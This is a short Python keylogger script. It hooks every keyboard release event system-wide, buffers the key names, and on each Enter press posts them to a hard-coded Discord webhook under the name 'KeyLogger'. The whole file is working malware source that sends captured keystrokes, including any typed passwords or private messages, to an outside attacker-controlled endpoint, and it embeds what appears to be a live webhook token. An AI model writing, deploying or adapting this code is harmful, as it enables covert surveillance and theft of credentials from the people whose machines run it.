import keyboard
import requests

WEBHOOK = "https://discord.com/api/webhooks/973952265838800916/mtFZaJI1zIdSZbg9Jhonn1CdxU6oHbBTlL9yU-JPu4PucNbv3idFZhWhf_SpWj1t6EK1"
LOG = []

def on_key_release(key):
    global LOG
    if key.name == "enter":
        data = {
            "username" : "KeyLogger"
        }
        data["embeds"] = [
            {
                "description" : f"{' '.join(LOG)}"
            }
        ]
        requests.post(WEBHOOK, json=data)
        LOG.clear()
    else:
        LOG.append(f"`{key.name}`")


keyboard.on_release(on_key_release)

keyboard.wait()